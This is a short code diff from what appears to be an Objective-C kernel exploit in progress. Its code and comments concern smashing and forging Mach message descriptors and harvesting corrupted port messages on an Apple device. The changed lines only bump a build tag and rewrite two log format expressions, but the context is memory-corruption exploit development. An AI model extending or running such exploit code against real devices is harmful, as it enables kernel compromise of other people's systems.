@@ -68,7 +68,7 @@
    tunes both without a rebuild: prefill = live portkind count placed
    fire-1 hop; burst = the fresh-small census load count (0 for the pure
    conversion round). */
-#define P073_BUILD @"p073-second-table-v12-runclass"
+#define P073_BUILD @"p073-second-table-v12b-labelfix"
 
 /* kmsg geometry — P034 contract: msgh_size 0x7FC -> kdata 0x820 (ANE class).
    v12: the class is RUNTIME — T8150's record law = 0x10b8 (notes 251/265,
@@ -443,7 +443,7 @@ static int p073_harvest_portkind(p073_held_t *v, uint32_t *descForgeOut, const c
         /* kernel choked on the received complex message — if this victim was
            fill-adjacent, the smashed descriptor region is the witness. */
         p073_log(@"  [!] PORTKIND %s[%u] recv mr=0x%x (desc processing rejected/errored)",
-                 label ?: @"?", v->index, mr);
+                 label ? label : "?", v->index, mr);
         p073_log(@"      head bytes at +%018zx: (hexdump below)", P073_PORT_BODY_OFF);
         uint8_t *rb = (uint8_t *)h;
         for (uint32_t row = 0; row < 6; row++) {
@@ -491,7 +491,7 @@ static int p073_harvest_portkind(p073_held_t *v, uint32_t *descForgeOut, const c
             forge++;
             p073_log(@"  [+] DESC SMASHED %s[%u] desc[%u] name=0x%08x pad=0x%08x "
                      @"type=0x%04x disp=0x%04x (fill record: sid=%u flags=0x%08x tail=0x%04x%04x)",
-                     label ?: @"?", v->index, i, name, padw, dtype, ddisp,
+                     label ? label : "?", v->index, i, name, padw, dtype, ddisp,
                      name, padw, ddisp, dtype);
             /* v9: a fill-tail (0x1000000001) class landing = type 0x0001 = OOL —
                the conversion door read. Probe the address the kernel may have
